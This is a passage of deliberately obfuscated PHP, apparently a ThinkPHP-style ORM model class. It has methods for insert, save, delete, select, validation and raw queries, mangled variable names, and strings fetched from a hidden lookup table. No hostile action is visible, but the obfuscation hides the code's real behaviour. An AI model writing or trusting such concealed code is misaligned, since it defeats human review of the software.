$this->_facade($«Ãºä—); if (!1 === $this->_beforeInsert($«Ãºä—, $ÜŒïãô)) { return !1; } $î­ÛîïÅ = $this->db->insert($«Ãºä—, $ÜŒïãô, $Ÿòë¯À); if (!1 !== $î­ÛîïÅ) { $ ¯ä¨ò = $this->getLastInsID(); if ($ ¯ä¨ò) { $«Ãºä—[$this->getPk()] = $ ¯ä¨ò; $this->_after_insert($«Ãºä—, $ÜŒïãô); return $ ¯ä¨ò; } $this->_after_insert($«Ãºä—, $ÜŒïãô); } return $î­ÛîïÅ; } protected function _beforeInsert(&$§ñ­ …, $Ó¼²ÒÑÇ) { } protected function _after_insert($°Ãˆàô‚, $‰öŒ˜„±) { } public function addAll($šµİÈŞê, $”ÌƒÊª = array(), $Æğ¦Å²Á = false) { $Ğº¤­Î =& $_SERVER[Ó¡Ÿ§‚]; if (empty($šµİÈŞê)) { $this->error = think_lang($Ğº¤­Î[271]); return !1; } $”ÌƒÊª = $this->_parseOptions($”ÌƒÊª); foreach ($šµİÈŞê as $­‹˜şÚ => $İ€µÁ—û) { $šµİÈŞê[$­‹˜şÚ] = $this->_facade($İ€µÁ—û); } if (method_exists($this->db, $Ğº¤­Î[272])) { $¸Íùà´ = $this->db->insertAll($šµİÈŞê, $”ÌƒÊª, $Æğ¦Å²Á); } else { $this->startTrans(); foreach ($šµİÈŞê as $­‹˜şÚ => $İ€µÁ—û) { $¸Íùà´ = $this->db->insert($İ€µÁ—û, $”ÌƒÊª, $Æğ¦Å²Á); } $this->commit(); } if (!1 !== $¸Íùà´) { $êÍ“¿óö = $this->getLastInsID(); if ($êÍ“¿óö) { return $êÍ“¿óö; } } return $¸Íùà´; } public function selectAdd($ğç½­šÙ = '', $°æ§’œ = '', $¹í Š³³ = array()) { $¨ŸİñÉó =& $_SERVER[Ó¡Ÿ§‚]; $¹í Š³³ = $this->_parseOptions($¹í Š³³); if (!1 === ($†•§á’± = $this->db->selectInsert($ğç½­šÙ ? $ğç½­šÙ : $¹í Š³³[$¨ŸİñÉó[273]], $°æ§’œ ? $°æ§’œ : $this->getTableName(), $¹í Š³³))) { $this->error = think_lang($¨ŸİñÉó[274]); return !1; } else { return $†•§á’±; } } public function save($ü¥ø„ƒ­ = '', $‘å‘²ÌÚ = array()) { $¹Õùú ± =& $_SERVER[Ó¡Ÿ§‚]; if (empty($ü¥ø„ƒ­)) { if (!empty($this->data)) { $ü¥ø„ƒ­ = $this->data; $this->data = array(); } else { $this->error = think_lang($¹Õùú ±[271]); return !1; } } $ü¥ø„ƒ­ = $this->_facade($ü¥ø„ƒ­); $‘å‘²ÌÚ = $this->_parseOptions($‘å‘²ÌÚ); $¶íç¨Œ¬ = $this->getPk(); if (!isset($‘å‘²ÌÚ[$¹Õùú ±[275]])) { if (isset($ü¥ø„ƒ­[$¶íç¨Œ¬])) { $üšÚ¼ÈŸ[$¶íç¨Œ¬] = $ü¥ø„ƒ­[$¶íç¨Œ¬]; $‘å‘²ÌÚ[$¹Õùú ±[275]] = $üšÚ¼ÈŸ; unset($ü¥ø„ƒ­[$¶íç¨Œ¬]); } else { $this->error = think_lang($¹Õùú ±[274]); return !1; } } if (is_array($‘å‘²ÌÚ[$¹Õùú ±[275]]) && isset($‘å‘²ÌÚ[$¹Õùú ±[275]][$¶íç¨Œ¬])) { $ÃéÜ½ó = $‘å‘²ÌÚ[$¹Õùú ±[275]][$¶íç¨Œ¬]; } if (!1 === $this->_beforeUpdate($ü¥ø„ƒ­, $‘å‘²ÌÚ)) { return !1; } $Ù¢¤Ó½ò = $this->db->update($ü¥ø„ƒ­, $‘å‘²ÌÚ); if (!1 !== $Ù¢¤Ó½ò) { if (isset($ÃéÜ½ó)) { $ü¥ø„ƒ­[$¶íç¨Œ¬] = $ÃéÜ½ó; } $this->_afterUpdate($ü¥ø„ƒ­, $‘å‘²ÌÚ); } return $Ù¢¤Ó½ò; } protected function _beforeUpdate(&$îÀ‰›‚ı, $É€àŒ‰ú) { } protected function _afterUpdate($•—ŞÔê, $ÖÆ¤Ù°Û) { } public function delete($Ûì¨ºı = array()) { $ÉêòÓ¤µ =& $_SERVER[Ó¡Ÿ§‚]; if (empty($Ûì¨ºı) && empty($this->options[$ÉêòÓ¤µ[275]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $‰Õ¬¿ğš = $this->getPk(); if (is_numeric($Ûì¨ºı) || is_string($Ûì¨ºı)) { if (strpos($Ûì¨ºı, $ÉêòÓ¤µ[50])) { $ÊÀæßÃ»[$‰Õ¬¿ğš] = array($ÉêòÓ¤µ[276], $Ûì¨ºı); } else { $ÊÀæßÃ»[$‰Õ¬¿ğš] = $Ûì¨ºı; } $this->options[$ÉêòÓ¤µ[275]] = $ÊÀæßÃ»; } $Ûì¨ºı = $this->_parseOptions(); if (is_array($Ûì¨ºı[$ÉêòÓ¤µ[275]]) && isset($Ûì¨ºı[$ÉêòÓ¤µ[275]][$‰Õ¬¿ğš])) { $°ãÃ Ìõ = $Ûì¨ºı[$ÉêòÓ¤µ[275]][$‰Õ¬¿ğš]; } $ÔÇ¨ÊÉõ = $this->db->delete($Ûì¨ºı); if (!1 !== $ÔÇ¨ÊÉõ) { $éü®âßÑ = array(); if (isset($°ãÃ Ìõ)) { $éü®âßÑ[$‰Õ¬¿ğš] = $°ãÃ Ìõ; } $this->_after_delete($éü®âßÑ, $Ûì¨ºı); } return $ÔÇ¨ÊÉõ; } protected function _after_delete($Â§§ïÎÅ, $æ—¼ï›) { } public function select($ûáİ¿ˆı = array()) { $Ş‡¶ö =& $_SERVER[Ó¡Ÿ§‚]; if (is_string($ûáİ¿ˆı) || is_numeric($ûáİ¿ˆı)) { $ÍÑıå¢‡ = $this->getPk(); if (strpos($ûáİ¿ˆı, $Ş‡¶ö[50])) { $ßâ«‰ò¢[$ÍÑıå¢‡] = array($Ş‡¶ö[276], $ûáİ¿ˆı); } else { $ßâ«‰ò¢[$ÍÑıå¢‡] = $ûáİ¿ˆı; } $this->options[$Ş‡¶ö[275]] = $ßâ«‰ò¢; } elseif (!1 === $ûáİ¿ˆı) { $ûáİ¿ˆı = $this->_parseOptions(); return $Ş‡¶ö[277] . $this->db->buildSelectSql($ûáİ¿ˆı) . $Ş‡¶ö[278]; } $ûáİ¿ˆı = $this->_parseOptions(); $­¥å½÷¤ = $this->db->select($ûáİ¿ˆı); if (!1 === $­¥å½÷¤) { return !1; } if (empty($­¥å½÷¤)) { return null; } $this->_afterSelect($­¥å½÷¤, $ûáİ¿ˆı); return $­¥å½÷¤; } protected function _afterSelect(&$±üå–»ğ, $…ºŒÌù) { } public function buildSql($ùÃ›Úğ = array()) { $‹Æ”‹…ı =& $_SERVER[Ó¡Ÿ§‚]; $ùÃ›Úğ = $this->_parseOptions($ùÃ›Úğ); return $‹Æ”‹…ı[277] . $this->db->buildSelectSql($ùÃ›Úğ) . $‹Æ”‹…ı[278]; } public function optionsValue($ôå²³®” = null) { if (is_null($ôå²³®”)) { return $this->options; } elseif (is_array($ôå²³®”)) { $this->options = array_merge($this->options, $ôå²³®”); } } protected function _parseOptions($´Ãòõáœ = array()) { $Š¡¬Ÿµé =& $_SERVER[Ó¡Ÿ§‚]; if (is_array($´Ãòõáœ)) { $´Ãòõáœ = array_merge($this->options, $´Ãòõáœ); } $this->options = array(); if (!isset($´Ãòõáœ[$Š¡¬Ÿµé[279]])) { $´Ãòõáœ[$Š¡¬Ÿµé[279]] = $this->getTableName(); $‡øÛ¢ = $this->fields; } else { $‡øÛ¢ = $this->getDbFields(); } if (!empty($´Ãòõáœ[$Š¡¬Ÿµé[280]])) { $´Ãòõáœ[$Š¡¬Ÿµé[279]] .= $Š¡¬Ÿµé[53] . $´Ãòõáœ[$Š¡¬Ÿµé[280]]; } $´Ãòõáœ[$Š¡¬Ÿµé[281]] = $this->name; if (isset($´Ãòõáœ[$Š¡¬Ÿµé[275]]) && is_array($´Ãòõáœ[$Š¡¬Ÿµé[275]]) && !empty($‡øÛ¢) && !isset($´Ãòõáœ[$Š¡¬Ÿµé[282]]) && !isset($´Ãòõáœ[$Š¡¬Ÿµé[279]])) { foreach ($´Ãòõáœ[$Š¡¬Ÿµé[275]] as $Ë·şÛë¬ => $¦›ÒÓ÷) { $Ë·şÛë¬ = trim($Ë·şÛë¬); if (in_array($Ë·şÛë¬, $‡øÛ¢, !0)) { if (is_scalar($¦›ÒÓ÷)) { $this->_parseType($´Ãòõáœ[$Š¡¬Ÿµé[275]], $Ë·şÛë¬); } } elseif (!is_numeric($Ë·şÛë¬) && $Š¡¬Ÿµé[11] != substr($Ë·şÛë¬, 0, 1) && !1 === strpos($Ë·şÛë¬, $Š¡¬Ÿµé[10]) && !1 === strpos($Ë·şÛë¬, $Š¡¬Ÿµé[260]) && !1 === strpos($Ë·şÛë¬, $Š¡¬Ÿµé[283]) && !1 === strpos($Ë·şÛë¬, $Š¡¬Ÿµé[284])) { unset($´Ãòõáœ[$Š¡¬Ÿµé[275]][$Ë·şÛë¬]); } } } $this->_options_filter($´Ãòõáœ); return $´Ãòõáœ; } protected function _options_filter(&$şïŞ ƒÛ) { } protected function _parseType(&$•ÅÁŞˆ, $Ï½œóÌœ) { $²ú›û =& $_SERVER[Ó¡Ÿ§‚]; if (empty($this->options[$²ú›û[285]][$²ú›û[4] . $Ï½œóÌœ])) { $ùäìÀÒ = strtolower($this->fields[$²ú›û[252]][$Ï½œóÌœ]); if (!1 !== strpos($ùäìÀÒ, $²ú›û[286])) { } elseif (!1 === strpos($ùäìÀÒ, $²ú›û[287]) && !1 !== strpos($ùäìÀÒ, $²ú›û[288])) { $•ÅÁŞˆ[$Ï½œóÌœ] = intval($•ÅÁŞˆ[$Ï½œóÌœ]); } elseif (!1 !== strpos($ùäìÀÒ, $²ú›û[289]) || !1 !== strpos($ùäìÀÒ, $²ú›û[290])) { $•ÅÁŞˆ[$Ï½œóÌœ] = floatval($•ÅÁŞˆ[$Ï½œóÌœ]); } elseif (!1 !== strpos($ùäìÀÒ, $²ú›û[291])) { $•ÅÁŞˆ[$Ï½œóÌœ] = (bool) $•ÅÁŞˆ[$Ï½œóÌœ]; } } } public function find($¾‡‚¥“ï = array()) { $Š÷É³ã¡ =& $_SERVER[Ó¡Ÿ§‚]; if (is_numeric($¾‡‚¥“ï) || is_string($¾‡‚¥“ï)) { $Î® Œğü[$this->getPk()] = intval($¾‡‚¥“ï); $this->options[$Š÷É³ã¡[275]] = $Î® Œğü; } $this->options[$Š÷É³ã¡[292]] = 1; $¾‡‚¥“ï = $this->_parseOptions(); $é¯íù”İ = $this->db->select($¾‡‚¥“ï); if (!1 === $é¯íù”İ) { return !1; } if (empty($é¯íù”İ)) { return null; } $this->data = $é¯íù”İ[0]; $this->_afterFind($this->data, $¾‡‚¥“ï); if (!empty($this->options[$Š÷É³ã¡[293]])) { return $this->returnResult($this->data, $this->options[$Š÷É³ã¡[293]]); } return $this->data; } protected function _afterFind(&$•©óôóî, $–«Ÿ…¦) { } protected function returnResult($¡õãµ’, $öš“ö« = '') { $‘ºİÁóã =& $_SERVER[Ó¡Ÿ§‚]; if ($öš“ö«) { if (is_callable($öš“ö«)) { return call_user_func($öš“ö«, $¡õãµ’); } switch (strtolower($öš“ö«)) { case $‘ºİÁóã[294]: return json_encode($¡õãµ’); case $‘ºİÁóã[295]: return xml_encode($¡õãµ’); } } return $¡õãµ’; } public function parseFieldsMap($—ßş»ëÅ, $áœò÷´« = 1) { if (!empty($this->_map)) { foreach ($this->_map as $øÉŞáá => $‹’Ğ™«) { if ($áœò÷´« == 1) { if (isset($—ßş»ëÅ[$‹’Ğ™«])) { $—ßş»ëÅ[$øÉŞáá] = $—ßş»ëÅ[$‹’Ğ™«]; unset($—ßş»ëÅ[$‹’Ğ™«]); } } else { if (isset($—ßş»ëÅ[$øÉŞáá])) { $—ßş»ëÅ[$‹’Ğ™«] = $—ßş»ëÅ[$øÉŞáá]; unset($—ßş»ëÅ[$øÉŞáá]); } } } } return $—ßş»ëÅ; } public function setField($–úã€Åİ, $¢¾ë»¸Ï = '') { if (is_array($–úã€Åİ)) { $ğ…˜¿ËŠ = $–úã€Åİ; } else { $ğ…˜¿ËŠ[$–úã€Åİ] = $¢¾ë»¸Ï; } return $this->save($ğ…˜¿ËŠ); } public function setAdd($”®”¦ª, $¥ÄÌ—Û = 1) { $ÌÂ”­ÓÎ =& $_SERVER[Ó¡Ÿ§‚]; $€¼†¢ÙÍ = $”®”¦ª . $ÌÂ”­ÓÎ[296] . $¥ÄÌ—Û; if ($¥ÄÌ—Û < 0) { $€¼†¢ÙÍ = $”®”¦ª . $¥ÄÌ—Û; } return $this->setField($”®”¦ª, array($ÌÂ”­ÓÎ[297], $€¼†¢ÙÍ)); } public function getField($ÀÌ®¨ĞÅ, $ŞË¶ôÙ = null) { $ÈîãÀ­© =& $_SERVER[Ó¡Ÿ§‚]; $Íµâôóè[$ÈîãÀ­©[273]] = $ÀÌ®¨ĞÅ; $Íµâôóè = $this->_parseOptions($Íµâôóè); $ÀÌ®¨ĞÅ = trim($ÀÌ®¨ĞÅ); if (strpos($ÀÌ®¨ĞÅ, $ÈîãÀ­©[50])) { if (!isset($Íµâôóè[$ÈîãÀ­©[292]])) { $Íµâôóè[$ÈîãÀ­©[292]] = is_numeric($ŞË¶ôÙ) ? $ŞË¶ôÙ : $ÈîãÀ­©[12]; } $ÄÄŒè© = $this->db->select($Íµâôóè); if (!empty($ÄÄŒè©)) { $Ï ²€ö = explode($ÈîãÀ­©[50], $ÀÌ®¨ĞÅ); $ÀÌ®¨ĞÅ = array_keys($ÄÄŒè©[0]); $İ¯´•í³ = array_shift($ÀÌ®¨ĞÅ); $Ô¡É©•Ê = array_shift($ÀÌ®¨ĞÅ); $¾ÆƒÈÉ = array(); $Í¡óÌ™ì = count($Ï ²€ö); foreach ($ÄÄŒè© as $ƒ­İ¥®‘) { $ÍÌ½¬ã = $ƒ­İ¥®‘[$İ¯´•í³]; if (2 == $Í¡óÌ™ì) { $¾ÆƒÈÉ[$ÍÌ½¬ã] = $ƒ­İ¥®‘[$Ô¡É©•Ê]; } else { $¾ÆƒÈÉ[$ÍÌ½¬ã] = is_string($ŞË¶ôÙ) ? implode($ŞË¶ôÙ, $ƒ­İ¥®‘) : $ƒ­İ¥®‘; } } return $¾ÆƒÈÉ; } } else { if (!0 !== $ŞË¶ôÙ) { $Íµâôóè[$ÈîãÀ­©[292]] = is_numeric($ŞË¶ôÙ) ? $ŞË¶ôÙ : 1; } if ($ŞË¶ôÙ === $ÈîãÀ­©[255]) { unset($Íµâôóè[$ÈîãÀ­©[292]]); } $ƒ­İ¥®‘ = $this->db->select($Íµâôóè); if (!empty($ƒ­İ¥®‘)) { if ($ŞË¶ôÙ === $ÈîãÀ­©[255]) { return reset($ƒ­İ¥®‘[0]); } if (!0 !== $ŞË¶ôÙ && 1 == $Íµâôóè[$ÈîãÀ­©[292]]) { return reset($ƒ­İ¥®‘[0]); } foreach ($ƒ­İ¥®‘ as $ˆòœŸô¼) { $ˆˆêÍ¹µ[] = $ˆòœŸô¼[$ÀÌ®¨ĞÅ]; } return $ˆˆêÍ¹µ; } } return null; } public function create($‰ŸµÔÓ€ = '', $Öß¶´İÊ = '') { $È›½õæ =& $_SERVER[Ó¡Ÿ§‚]; if (empty($‰ŸµÔÓ€)) { $‰ŸµÔÓ€ = $_POST; } elseif (is_object($‰ŸµÔÓ€)) { $‰ŸµÔÓ€ = get_object_vars($‰ŸµÔÓ€); } if (empty($‰ŸµÔÓ€) || !is_array($‰ŸµÔÓ€)) { $this->error = think_lang($È›½õæ[271]); return !1; } $‰ŸµÔÓ€ = $this->parseFieldsMap($‰ŸµÔÓ€, 0); $Öß¶´İÊ = $Öß¶´İÊ ? $Öß¶´İÊ : (!empty($‰ŸµÔÓ€[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$È›½õæ[273]])) { $µ³èâ¶ê = $this->options[$È›½õæ[273]]; unset($this->options[$È›½õæ[273]]); } elseif ($Öß¶´İÊ == THINK_MODEL_INSERT && isset($this->insertFields)) { $µ³èâ¶ê = $this->insertFields; } elseif ($Öß¶´İÊ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $µ³èâ¶ê = $this->updateFields; } if (isset($µ³èâ¶ê)) { if (is_string($µ³èâ¶ê)) { $µ³èâ¶ê = explode($È›½õæ[50], $µ³èâ¶ê); } if (think_config($È›½õæ[298])) { $µ³èâ¶ê[] = think_config($È›½õæ[299]); } foreach ($‰ŸµÔÓ€ as $¨®ó±› => $¨›‡Œ¤º) { if (!in_array($¨®ó±›, $µ³èâ¶ê)) { unset($‰ŸµÔÓ€[$¨®ó±›]); } } } if (!$this->autoValidation($‰ŸµÔÓ€, $Öß¶´İÊ)) { return !1; } if (!$this->autoCheckToken($‰ŸµÔÓ€)) { $this->error = think_lang($È›½õæ[300]); return !1; } if ($this->autoCheckFields) { $µ³èâ¶ê = $this->getDbFields(); foreach ($‰ŸµÔÓ€ as $¨®ó±› => $¨›‡Œ¤º) { if (!in_array($¨®ó±›, $µ³èâ¶ê)) { unset($‰ŸµÔÓ€[$¨®ó±›]); } elseif (MAGIC_QUOTES_GPC && is_string($¨›‡Œ¤º)) { $‰ŸµÔÓ€[$¨®ó±›] = stripslashes($¨›‡Œ¤º); } } } $this->autoOperation($‰ŸµÔÓ€, $Öß¶´İÊ); $this->data = $‰ŸµÔÓ€; return $‰ŸµÔÓ€; } public function autoCheckToken($Ú³„üÕ) { $‘´Ù’¢ç =& $_SERVER[Ó¡Ÿ§‚]; if (isset($this->options[$‘´Ù’¢ç[301]]) && !$this->options[$‘´Ù’¢ç[301]]) { return !0; } if (think_config($‘´Ù’¢ç[298])) { $ˆä¯ÀçÀ = think_config($‘´Ù’¢ç[299]); if (!isset($Ú³„üÕ[$ˆä¯ÀçÀ]) || Session::get($ˆä¯ÀçÀ)) { return !1; } list($™Ÿ¢»µÙ, $Ù”çÜŸ) = explode($‘´Ù’¢ç[11], $Ú³„üÕ[$ˆä¯ÀçÀ]); if ($Ù”çÜŸ && Session::get($ˆä¯ÀçÀ . $‘´Ù’¢ç[10] . $™Ÿ¢»µÙ) === $Ù”çÜŸ) { Session::remove($ˆä¯ÀçÀ . $‘´Ù’¢ç[10] . $™Ÿ¢»µÙ); return !0; } if (think_config($‘´Ù’¢ç[302])) { Session::remove($ˆä¯ÀçÀ . $‘´Ù’¢ç[10] . $™Ÿ¢»µÙ); } return !1; } return !0; } public function regex($¿¿œ¶È·, $·°è Å) { $æ”ÑÔİù =& $_SERVER[Ó¡Ÿ§‚]; $ÍçÈÆØñ = array($æ”ÑÔİù[303] => $æ”ÑÔİù[304], $æ”ÑÔİù[305] => $æ”ÑÔİù[306], $æ”ÑÔİù[307] => $æ”ÑÔİù[308], $æ”ÑÔİù[309] => $æ”ÑÔİù[310], $æ”ÑÔİù[311] => $æ”ÑÔİù[312], $æ”ÑÔİù[313] => $æ”ÑÔİù[314], $æ”ÑÔİù[315] => $æ”ÑÔİù[316], $æ”ÑÔİù[290] => $æ”ÑÔİù[317], $æ”ÑÔİù[318] => $æ”ÑÔİù[319]); if (isset($ÍçÈÆØñ[strtolower($·°è Å)])) { $·°è Å = $ÍçÈÆØñ[strtolower($·°è Å)]; } return preg_match($·°è Å, $¿¿œ¶È·) === 1; } private function autoOperation(&$ŠöÜµíŸ, $ŒŞ¬€¢) { $íê³šß® =& $_SERVER[Ó¡Ÿ§‚]; if (!empty($this->options[$íê³šß®[320]])) { $Çœş­È¤ = $this->options[$íê³šß®[320]]; unset($this->options[$íê³šß®[320]]); } elseif (!empty($this->_auto)) { $Çœş­È¤ = $this->_auto; } if (isset($Çœş­È¤)) { foreach ($Çœş­È¤ as $·ßÉÊã¸) { if (empty($·ßÉÊã¸[2])) { $·ßÉÊã¸[2] = THINK_MODEL_INSERT; } if ($ŒŞ¬€¢ == $·ßÉÊã¸[2] || $·ßÉÊã¸[2] == THINK_MODEL_BOTH) { switch (trim($·ßÉÊã¸[3])) { case $íê³šß®[321]: case $íê³šß®[322]: $÷âı”… = isset($·ßÉÊã¸[4]) ? (array) $·ßÉÊã¸[4] : array(); if (isset($ŠöÜµíŸ[$·ßÉÊã¸[0]])) { array_unshift($÷âı”…, $ŠöÜµíŸ[$·ßÉÊã¸[0]]); } if ($íê³šß®[321] == $·ßÉÊã¸[3]) { $ŠöÜµíŸ[$·ßÉÊã¸[0]] = call_user_func_array($·ßÉÊã¸[1], $÷âı”…); } else { $ŠöÜµíŸ[$·ßÉÊã¸[0]] = call_user_func_array(array(&$this, $·ßÉÊã¸[1]), $÷âı”…); } break; case $íê³šß®[273]: $ŠöÜµíŸ[$·ßÉÊã¸[0]] = $ŠöÜµíŸ[$·ßÉÊã¸[1]]; break; case $íê³šß®[323]: if ($íê³šß®[12] === $ŠöÜµíŸ[$·ßÉÊã¸[0]]) { unset($ŠöÜµíŸ[$·ßÉÊã¸[0]]); } break; case $íê³šß®[324]: default: $ŠöÜµíŸ[$·ßÉÊã¸[0]] = $·ßÉÊã¸[1]; } if (!1 === $ŠöÜµíŸ[$·ßÉÊã¸[0]]) { unset($ŠöÜµíŸ[$·ßÉÊã¸[0]]); } } } } return $ŠöÜµíŸ; } protected function autoValidation($›Ì‘¦ûç, $›úÈÛú) { $Û¼¾æ¯â =& $_SERVER[Ó¡Ÿ§‚]; if (!empty($this->options[$Û¼¾æ¯â[325]])) { $ÇõŒ‡š° = $this->options[$Û¼¾æ¯â[325]]; unset($this->options[$Û¼¾æ¯â[325]]); } elseif (!empty($this->_validate)) { $ÇõŒ‡š° = $this->_validate; } if (isset($ÇõŒ‡š°)) { if ($this->patchValidate) { $this->error = array(); } foreach ($ÇõŒ‡š° as $‚ù›‰ => $Â½á¹Ù) { if (empty($Â½á¹Ù[5]) || $Â½á¹Ù[5] == THINK_MODEL_BOTH || $Â½á¹Ù[5] == $›úÈÛú) { if (0 == strpos($Â½á¹Ù[2], $Û¼¾æ¯â[326]) && strpos($Â½á¹Ù[2], $Û¼¾æ¯â[327])) { $Â½á¹Ù[2] = think_lang(substr($Â½á¹Ù[2], 2, -1)); } $Â½á¹Ù[3] = isset($Â½á¹Ù[3]) ? $Â½á¹Ù[3] : THINK_EXISTS_VALIDATE; $Â½á¹Ù[4] = isset($Â½á¹Ù[4]) ? $Â½á¹Ù[4] : $Û¼¾æ¯â[328]; switch ($Â½á¹Ù[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($›Ì‘¦ûç, $Â½á¹Ù)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($Û¼¾æ¯â[12] != trim($›Ì‘¦ûç[$Â½á¹Ù[0]])) { if (!1 === $this->_validationField($›Ì‘¦ûç, $Â½á¹Ù)) { return !1; } } break; default: if (isset($›Ì‘¦ûç[$Â½á¹Ù[0]])) { if (!1 === $this->_validationField($›Ì‘¦ûç, $Â½á¹Ù)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($’’®ÚÓï, $¹†®¥’) { if (!1 === $this->_validationFieldItem($’’®ÚÓï, $¹†®¥’)) { if ($this->patchValidate) { $this->error[$¹†®¥’[0]] = $¹†®¥’[2]; } else { $this->error = $¹†®¥’[2]; return !1; } } return; } protected function _validationFieldItem($µ³ˆ”ºç, $÷¥íšìŞ) { $Æİ‚Ø²Ø =& $_SERVER[Ó¡Ÿ§‚]; switch (strtolower(trim($÷¥íšìŞ[4]))) { case $Æİ‚Ø²Ø[321]: case $Æİ‚Ø²Ø[322]: $®µ˜²• = isset($÷¥íšìŞ[6]) ? (array) $÷¥íšìŞ[6] : array(); if (is_string($÷¥íšìŞ[0]) && strpos($÷¥íšìŞ[0], $Æİ‚Ø²Ø[50])) { $÷¥íšìŞ[0] = explode($Æİ‚Ø²Ø[50], $÷¥íšìŞ[0]); } if (is_array($÷¥íšìŞ[0])) { foreach ($÷¥íšìŞ[0] as $ü€«¶‚Ø) { $ˆşÎ¼ä[$ü€«¶‚Ø] = $µ³ˆ”ºç[$ü€«¶‚Ø]; } array_unshift($®µ˜²•, $ˆşÎ¼ä); } else { array_unshift($®µ˜²•, $µ³ˆ”ºç[$÷¥íšìŞ[0]]); } if ($Æİ‚Ø²Ø[321] == $÷¥íšìŞ[4]) { return call_user_func_array($÷¥íšìŞ[1], $®µ˜²•); } else { return call_user_func_array(array(&$this, $÷¥íšìŞ[1]), $®µ˜²•); } case $Æİ‚Ø²Ø[329]: return $µ³ˆ”ºç[$÷¥íšìŞ[0]] == $µ³ˆ”ºç[$÷¥íšìŞ[1]]; case $Æİ‚Ø²Ø[330]: if (is_string($÷¥íšìŞ[0]) && strpos($÷¥íšìŞ[0], $Æİ‚Ø²Ø[50])) { $÷¥íšìŞ[0] = explode($Æİ‚Ø²Ø[50], $÷¥íšìŞ[0]); } $¸ğ¾ Ú¥ = array(); if (is_array($÷¥íšìŞ[0])) { foreach ($÷¥íšìŞ[0] as $ü€«¶‚Ø) { $¸ğ¾ Ú¥[$ü€«¶‚Ø] = $µ³ˆ”ºç[$ü€«¶‚Ø]; } } else { $¸ğ¾ Ú¥[$÷¥íšìŞ[0]] = $µ³ˆ”ºç[$÷¥íšìŞ[0]]; } if (!empty($µ³ˆ”ºç[$this->getPk()])) { $¸ğ¾ Ú¥[$this->getPk()] = array($Æİ‚Ø²Ø[331], $µ³ˆ”ºç[$this->getPk()]); } if ($this->where($¸ğ¾ Ú¥)->find()) { return !1; } return !0; default: return $this->check($µ³ˆ”ºç[$÷¥íšìŞ[0]], $÷¥íšìŞ[1], $÷¥íšìŞ[4]); } } public function check($™šş²Ä‡, $íĞ‰ïß®, $¾•€ı¤§ = "\162\145\147\x65\x78") { $‘Šäª’ =& $_SERVER[Ó¡Ÿ§‚]; $¾•€ı¤§ = strtolower(trim($¾•€ı¤§)); switch ($¾•€ı¤§) { case $‘Šäª’[7]: case $‘Šäª’[332]: $œØáÑ»ñ = is_array($íĞ‰ïß®) ? $íĞ‰ïß® : explode($‘Šäª’[50], $íĞ‰ïß®); return $¾•€ı¤§ == $‘Šäª’[7] ? in_array($™šş²Ä‡, $œØáÑ»ñ) : !in_array($™šş²Ä‡, $œØáÑ»ñ); case $‘Šäª’[333]: case $‘Šäª’[334]: if (is_array($íĞ‰ïß®)) { $‘Óü‚Şè = $íĞ‰ïß®[0]; $Î¤è’Ìî = $íĞ‰ïß®[1]; } else { list($‘Óü‚Şè, $Î¤è’Ìî) = explode($‘Šäª’[50], $íĞ‰ïß®); } return $¾•€ı¤§ == $‘Šäª’[333] ? $™šş²Ä‡ >= $‘Óü‚Şè && $™šş²Ä‡ <= $Î¤è’Ìî : $™šş²Ä‡ < $‘Óü‚Şè || $™šş²Ä‡ > $Î¤è’Ìî; case $‘Šäª’[335]: case $‘Šäª’[336]: return $¾•€ı¤§ == $‘Šäª’[335] ? $™šş²Ä‡ == $íĞ‰ïß® : $™šş²Ä‡ != $íĞ‰ïß®; case $‘Šäª’[337]: $’»ÎÑÙñ = mb_strlen($™šş²Ä‡, $‘Šäª’[338]); if (strpos($íĞ‰ïß®, $‘Šäª’[50])) { list($‘Óü‚Şè, $Î¤è’Ìî) = explode($‘Šäª’[50], $íĞ‰ïß®); return $’»ÎÑÙñ >= $‘Óü‚Şè && $’»ÎÑÙñ <= $Î¤è’Ìî; } else { return $’»ÎÑÙñ == $íĞ‰ïß®; } case $‘Šäª’[339]: list($ÔÊ³³Ğ„, $İÁÆÀ™Ç) = explode($‘Šäª’[50], $íĞ‰ïß®); if (!is_numeric($ÔÊ³³Ğ„)) { $ÔÊ³³Ğ„ = strtotime($ÔÊ³³Ğ„); } if (!is_numeric($İÁÆÀ™Ç)) { $İÁÆÀ™Ç = strtotime($İÁÆÀ™Ç); } return NOW_TIME >= $ÔÊ³³Ğ„ && NOW_TIME <= $İÁÆÀ™Ç; case $‘Šäª’[340]: return in_array(get_client_ip(), explode($‘Šäª’[50], $íĞ‰ïß®)); case $‘Šäª’[341]: return !in_array(get_client_ip(), explode($‘Šäª’[50], $íĞ‰ïß®)); case $‘Šäª’[328]: default: return $this->regex($™šş²Ä‡, $íĞ‰ïß®); } } public function query($ŒáœŒªƒ, $°…¿›Â = false) { $öÎ²øŒ =& $_SERVER[Ó¡Ÿ§‚]; if (!is_bool($°…¿›Â) && !is_array($°…¿›Â)) { $°…¿›Â = func_get_args(); array_shift($°…¿›Â); } $ŒáœŒªƒ = str_replace(array($öÎ²øŒ[231], $öÎ²øŒ[342]), $öÎ²øŒ[53], $ŒáœŒªƒ); $ŒáœŒªƒ = $this->parseSql($ŒáœŒªƒ, $°…¿›Â); return $this->db->query($ŒáœŒªƒ); } public function execute($¹‹ºı´¥, $¼†ìÈà = false) { if (!is_bool($¼†ìÈà) && !is_array($¼†ìÈà)) { $¼†ìÈà = func_get_args(); array_shift($¼†ìÈà); } $¹‹ºı´¥ = $this->parseSql($¹‹ºı´¥, $¼†ìÈà); return $this->db->execute($¹‹ºı´¥); } protected function parseSql($¤âğ‹º, $ëŸ‹èÂ¸) { $Æ×Ÿ‹š‘ =& $_SERVER[Ó¡Ÿ§‚]; if (!0 === $ëŸ‹èÂ¸) { $ÅÀ„êåÜ = $this->_parseOptions(); $¤âğ‹º = $this->db->parseSql($¤âğ‹º, $ÅÀ„êåÜ); } elseif (is_array($ëŸ‹èÂ¸)) { $ëŸ‹èÂ¸ = array_map(array($this->db, $Æ×Ÿ‹š‘[343]), $ëŸ‹èÂ¸); $¤âğ‹º = vsprintf($¤âğ‹º, $ëŸ‹èÂ¸); } else { $¤âğ‹º = strtr($¤âğ‹º, array($Æ×Ÿ‹š‘[344] => $this->getTableName(), 